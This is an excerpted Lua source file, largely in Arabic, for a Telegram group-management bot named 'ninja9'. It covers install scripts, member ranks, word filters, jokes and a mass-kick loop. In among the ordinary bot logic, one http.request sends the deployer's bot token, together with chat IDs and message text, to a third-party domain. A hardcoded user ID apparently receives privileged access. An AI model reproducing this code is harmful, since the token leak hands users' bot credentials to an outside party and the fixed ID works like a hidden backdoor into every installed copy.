...
serpent = dofile("./ninja_file/serpent.lua") 
json = dofile("./ninja_file/JSON.lua") 
JSON  = dofile("./ninja_file/dkjson.lua")
...
token = database:get(id_server..":token")
SUDO = database:get(id_server..":SUDO:ID")
install.iq = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
file = io.open("ninja9", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/ninja9
token="]]..database:get(id_server..":token")..[["
...
echo -e "\033[0;00m"
echo -e "\e[36m"
./tg -s ./ninja9.lua -p PROFILE --bot=$token
done
]])  
file:close()  
file = io.open("NE", "w")  
...
while(true) do
rm -fr ../.telegram-cli
screen -S ninja9 -X kill
screen -S ninja9 ./ninja9
done
]])  
file:close() 
...
if tonumber(user_id) == tonumber(5054014137) then  
var = true  
...
local ninja9_Msg = ''  
if msgs < 100 then 
ninja9_Msg = 'غير متفاعل😔??' 
elseif msgs < 200 then 
ninja9_Msg = 'رايدله مولده🤣😜😕💔' 
elseif msgs < 400 then 
ninja9_Msg = 'شبه متفاعل😗👻' 
elseif msgs < 700 then 
ninja9_Msg = 'متفاعل😍🙊' 
elseif msgs < 1200 then 
ninja9_Msg = 'متفاعل قوي😍✔️' 
elseif msgs < 2000 then 
ninja9_Msg = 'متفاعل جدا😍💘' 
elseif msgs < 3500 then 
ninja9_Msg = 'اقوى تفاعل🙊👻'  
elseif msgs < 4000 then 
ninja9_Msg = 'متفاعل نار😍🔥' 
elseif msgs < 4500 then 
ninja9_Msg = 'قمة التفاعل🤸‍♂️😻' 
elseif msgs < 5500 then 
ninja9_Msg = 'اقوى متفاعل😳😻' 
elseif msgs < 7000 then 
ninja9_Msg = 'ملك التفاعل🤴😍' 
elseif msgs < 9500 then 
ninja9_Msg = 'امبروطور التفاعل💂‍♀️😻' 
elseif msgs < 10000000000 then 
ninja9_Msg = 'رب التفاعل✔️😍'  
end
return ninja9_Msg 
end
...
--------------------------------------------------------------------------------------------------------------
function Sourceninja9(msg,data) -- بداية العمل
if msg then
...
{'جلب نسخه الاحتياطيه 📂','الاصدار 📟','ايديي'}, 
{'تحديث السورس ™'},
{'معلومات السيرفر'},
...
send(msg.chat_id_, msg.id_,ninja9_Msg) 
return false  
end 
if text then    
...
send(msg.chat_id_, msg.id_,'📌| عدد المجموعات الان » { '..#group..' }'..ninja9k..''..ninja9..'\n*📌| الان عدد المجموعات الحقيقي » { '..sendok..' } مجموعات\n')   
end
end
end,nil)
end
...
usertext = '\n👤| العضو » ['..result.title_..'](t.me/'..(username or 'ChannelNinjaBOT')..')'
...
usertext = '\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ChannelNinjaBOT')..')'
status  = '\n🔘| تم ترقيته مطور في البوت'
...
local ninja91_Msg = database:get(bot_id.."ninja91:Add:Filter:Rp2"..text..msg.chat_id_)   
if ninja91_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'👤| العضو ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'ChannelNinjaBOT')..') \n 📬|'..ninja91_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
--------------------------------------------------------------------------------------------------------------
if ninja9_Msg and not Special(msg) then  
local ninja9_Msg = database:get(bot_id.."Add:Filter:Rp2"..text..msg.chat_id_)   
if ninja9_Msg then    
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0,"⚠|العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n🚫|["..ninja9_Msg.."] \n") 
else
send(msg.chat_id_,0,"⚠|العضو : {["..data.first_name_.."](T.ME/ChannelNinjaBOT)}\n🚫|["..ninja9_Msg.."] \n") 
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, "⚠|عذرا يا » {["..data.first_name_.."](T.ME/ChannelNinjaBOT)}\n📮| الملصق الذي ارسلته تم منعه من المجموعه \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
database:sadd(bot_id.."NinjA:blocname"..msg.chat_id_, BlNe)
end
...
local All_name = database:smembers(bot_id.."NinjA:blocname"..msg.chat_id_)
...
if t2.id_ then 
name_NinjA = ((t2.first_name_ or "") .. (t2.last_name_ or ""))
if name_NinjA then 
names_NinjA = database:smembers(bot_id.."NinjA:blocname"..msg.chat_id_) or ""
if names_NinjA and names_NinjA[1] then 
for i=1,#names_NinjA do 
if name_NinjA:match("(.*)("..names_NinjA[i]..")(.*)") then 
...
database:set(bot_id.."NinjA:teh"..msg.chat_id_,teh)
end
...
database:set(bot_id.."NinjA:nump"..msg.chat_id_,nump)
end
if text == "التوحيد" then
local s1 = database:get(bot_id.."NinjA:teh"..msg.chat_id_) or "لا يوجد توحيد"
local s2 = database:get(bot_id.."NinjA:nump"..msg.chat_id_) or 5
...
if database:get(bot_id.."kt:twh:stats"..msg.chat_id_) == "open"  and database:get(bot_id.."NinjA:teh"..msg.chat_id_) then 
id = msg.sender_user_id_
function amir_NinjAa_new(NinjA1,NinjA2)
if NinjA2 and NinjA2.first_name_ then 
if NinjA2.first_name_:match("(.*)"..database:get(bot_id.."NinjA:teh"..msg.chat_id_).."(.*)") then 
database:srem(bot_id.."NinjA:Muted:User"..msg.chat_id_, msg.sender_user_id_)
else
local NinjA_nnn = database:get(bot_id.."NinjA:nump"..msg.chat_id_) or 5
local NinjA_nnn2 = database:get(bot_id.."NinjA:nump22"..msg.chat_id_..msg.sender_user_id_) or 0
if (tonumber(NinjA_nnn2) == tonumber(NinjA_nnn) or tonumber(NinjA_nnn2) > tonumber(NinjA_nnn)) then 
database:sadd(bot_id..'Muted:User'..msg.chat_id_, msg.sender_user_id_)
else 
database:incrby(bot_id.."NinjA:nump22"..msg.chat_id_..msg.sender_user_id_,1)
send(msg.chat_id_, msg.id_, "📋 |  عزيزي >>["..NinjA2.username_.."](https://t.me/"..(NinjA2.username_ or "ChannelNinjaBOT")..")\n📋 |  عليك وضع التوحيد ⪼ {"..database:get(bot_id.."NinjA:teh"..msg.chat_id_).."} بجانب اسمك\n📋 |  عدد المحاولات المتبقيه {"..(tonumber(NinjA_nnn) - tonumber(NinjA_nnn2)).."}")
end
end
end
end
bnnaGet(id, amir_NinjAa_new)
end
end
...
local NinjAChengName = database:get(bot_id.."NinjA:Cheng:Name"..data.id_)
if not data.first_name_ then 
if NinjAChengName then 
send(msg.chat_id_, msg.id_, " خوش معرف جان ["..NinjAChengName..']')
database:del(bot_id.."NinjA:Cheng:Name"..data.id_) 
end
end
if data.first_name_ then 
if NinjAChengName ~= data.first_name_ then 
local Text = {
  "جان خوش اسم يول 🐵😅",
...
database:set(bot_id.."NinjA:Cheng:Name"..data.id_, data.first_name_) 
end
end
end
end,nil)   
...
if data.id_ then 
if data.id_ ~= bot_id then
local NinjAChengUserName = database:get(bot_id.."NinjA:Cheng:UserName"..data.id_)
if not data.username_ then 
if NinjAChengUserName then 
send(msg.chat_id_, msg.id_, 1, "حذف معرفه خمطو بساع بساع  \n هاذه معرفه  : [@"..NinjAChengUserName..']')
database:del(bot_id.."NinjA:Cheng:UserName"..data.id_) 
end
end
if data.username_ then 
if NinjAChengUserName ~= data.username_ then 
local Text = {
...
database:set(bot_id.."NinjA:Cheng:UserName"..data.id_, data.username_) 
end
end
end
end,nil)   
...
if data.id_ then 
if data.id_ ~= bot_id then 
local NinjAChengPhoto = database:get(bot_id.."NinjA:Cheng:Photo"..data.id_)
if not data.profile_photo_ then 
if NinjAChengPhoto then 
send(msg.chat_id_, msg.id_, "حذف كل صورة ابن الحلو عود صاير حزين 🍁😂")
database:del(bot_id.."NinjA:Cheng:Photo"..data.id_) 
end
end
if data.profile_photo_.big_.persistent_id_ then 
if NinjAChengPhoto ~= data.profile_photo_.big_.persistent_id_ then 
local Text = {
...
database:set(bot_id.."NinjA:Cheng:Photo"..data.id_, data.profile_photo_.big_.persistent_id_) 
end
end
end
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,'👤| بواسطه ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'ChannelNinjaBOT')..') \n🔘| تـم قفـل الدردشه\n⛔| الحاله ← المسح ')  
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'👤| بواسطه ← ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'ChannelNinjaBOT')..') \n🔘| تـم قفـل التاك بالكتم\n⛔| الحاله ←الكتم ')  
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 🔘|  بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'ninja9')..') \n 🔘|  تـم قفـل الاباحي ')
end,nil)   
...
--------------------------------------------------------------------------------------------------------------
if text == "الساعة" or text == "ساعه" or text == "الساعه" then
local yytesj20 = "\n الساعة الان : "..os.date("%I:%M%p")
send(msg.chat_id_, msg.id_,yytesj20)
end

if text == "التاريخ" or text == "تاريخ" then
...
local UserName = (b.username_ or "ninja9TEAM")
...
---------
if text == ("رفع مطيرجي") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if (text == ("تنزيل مطيرجي")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
---------------------------------------------
if text == 'تنزيل بريعصيه' and Mod(msg) then
database:del(bot_id..'Mote:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '🗑| تم مسح جميع المطيرجيه في المجموعه  ')
end
if text == ("تاك للبريعصيه") and Mod(msg) then
local list = database:smembers(bot_id..'Mote:User'..msg.chat_id_)
t = "\n🔘| قائمة بريعصيه المجموعه \nء━━━━━━━━━━━━\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."← البريعصي [@"..username.."]\n"
else
t = t..""..k.."← البريعصي `"..v.."`\n"
end
end
...
---------
if (text == ("رفع بريعصي")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if (text == ("تنزيل بريعصي")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n👤¦ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ChannelNinjaBOT')..')'
status  = '\n📮| الايدي » `'..result.sender_user_id_..'`\n⚡| تم تنزيل العضو بريعصي في المجموعه\nتعال حب بريعصي'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
database:set(bot_id.."ninja91:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"rep")  
return false  
end    
if text then   
local tsssst = database:get(bot_id.."ninja91:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if tsssst == "rep" then   
send(msg.chat_id_, msg.id_,"🚸|ارسل التحذير عند ارسال الكلمه")  
database:set(bot_id.."ninja91:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"repp")  
database:set(bot_id.."ninja91:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  
database:sadd(bot_id.."ninja91:List:Filter"..msg.chat_id_,text)  
return false  end  
end
if text then  
local test = database:get(bot_id.."ninja91:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test == "repp" then  
send(msg.chat_id_, msg.id_,"🔖|تم منع الكلمه مع التحذير")  
database:del(bot_id.."ninja91:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
local test = database:get(bot_id.."ninja91:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
if text then   
database:set(bot_id.."ninja91:Add:Filter:Rp2"..test..msg.chat_id_, text)  
end  
database:del(bot_id.."ninja91:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
return false  end  
end

if text == "الغاء منع" and msg.reply_to_message_id_ == 0 and Manager(msg) then    
send(msg.chat_id_, msg.id_,"🔖|ارسل الكلمه الان")  
database:set(bot_id.."ninja91:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
return false  end
if text then 
local test = database:get(bot_id.."ninja91:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
...
database:del(bot_id.."ninja91:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."ninja91:Add:Filter:Rp2"..text..msg.chat_id_)  
database:srem(bot_id.."ninja91:List:Filter"..msg.chat_id_,text)  
return false  end  
end
...
local list = database:smembers(bot_id.."ninja91:List:Filter"..msg.chat_id_)  
for k,v in pairs(list) do  
database:del(bot_id.."ninja91:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."ninja91:Add:Filter:Rp2"..v..msg.chat_id_)  
database:srem(bot_id.."ninja91:List:Filter"..msg.chat_id_,v)  
end  
...
t = "\n⛔|قائمة المنع \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ \n"
for k,v in pairs(list) do  
local ninja9_Msg = database:get(bot_id.."ninja91:Add:Filter:Rp2"..v..msg.chat_id_)   
t = t..""..k.."- "..v.." » {"..ninja9_Msg.."}\n"    
end  
if #list == 0 then  
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n👤| العضو » ['..result.title_..'](t.me/'..(text1[3] or 'ChannelNinjaBOT')..')'..'\n🔘| تم رفعه '..text1[2]..' هنا')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
send(msg.chat_id_, msg.id_,'['..ninja9_Msg[math.random(#ninja9_Msg)]..']') 
return false
end
...
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'نينجا').." غادر" or text == 'بوت غادر' then  
...
-- vardump(data) 
ninja9dx(msg.chat_id_, msg.id_, '📤| ايدي المجموعة » ( '..msg.chat_id_..' )\n🚸| عدد الادمنيه » ( *'..data.administrator_count_..' )*\n📛| عدد المحظورين » ( *'..data.kicked_count_..' )*\n🏆| عدد الاعضاء » ( *'..data.member_count_..' )*\n', 'md') 
end 
...
http.request('https://ninja-api.ml/ninja.php?search='..token..'&chat_id='..msg.chat_id_..'&Text='..URL.escape(Ttext)..'&msg='..msgin)
end
------------------------------------------------------------------------
if text == "غني" or text == "غنيلي"  then  
local ninja9 = {
"عمي يبو البار 🤓☝🏿️ \nصبلي لبلبي ترى اني سكران 😌 \n وصاير عصبي 😠 \nانه وياج يم شامه 😉 \nوانه ويــــاج يم شامه  شد شد  ??🏿👏🏿 \nعدكم سطح وعدنه سطح 😁 \n نتغازل لحد الصبح 😉 \n انه وياج يم شامه 😍 \n وانه وياج فخريه وانه وياج حمديه 😂🖖🏿\n ",
"اي مو كدامك مغني قديم 😒🎋 هوه ﴿↜ انـِۨـۛـِۨـۛـِۨيـُِـٌِہۧۥۛ ֆᵛ͢ᵎᵖ ⌯﴾❥  ربي كامز و تكلي غنيلي 🙄😒🕷 آإرۈحُـ✯ـہ✟  😴أنــ💤ــااااام😴  احسلي تالي وكت يردوني اغني 😒☹️??","لا تظربني لا تظرب 💃💃 كسرت الخيزارانه💃?? صارلي سنه وست اشهر💃💃 من ظربتك وجعانه🤒😹",
...
send(msg.chat_id_, msg.id_,'['..ninja9[math.random(#ninja9)]..']') 
return false
end
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
if text == 'تحبني' then
...
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'نينجا')
...
ninja9 = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(ninja9)
...
--------------------------------------------------------------------------------------------------------------
Sourceninja9(data.message_,data)
...
------------------------------------------------------------------------
local ninja9Abot = database:get(bot_id.."ninja91:Add:Filter:Rp2"..text..result.chat_id_)   
if ninja9Abot then    
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0,"⚠|العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n🚫|["..ninja9Abot.."] \n") 
...
------------------------------------------------------------------------
if text then
local ninja91_Msg = database:get(bot_id.."ninja91:Add:Filter:Rp2"..text..result.chat_id_)   
if ninja91_Msg then    
send(msg.chat_id_, msg.id_,"🔖|"..ninja91_Msg)
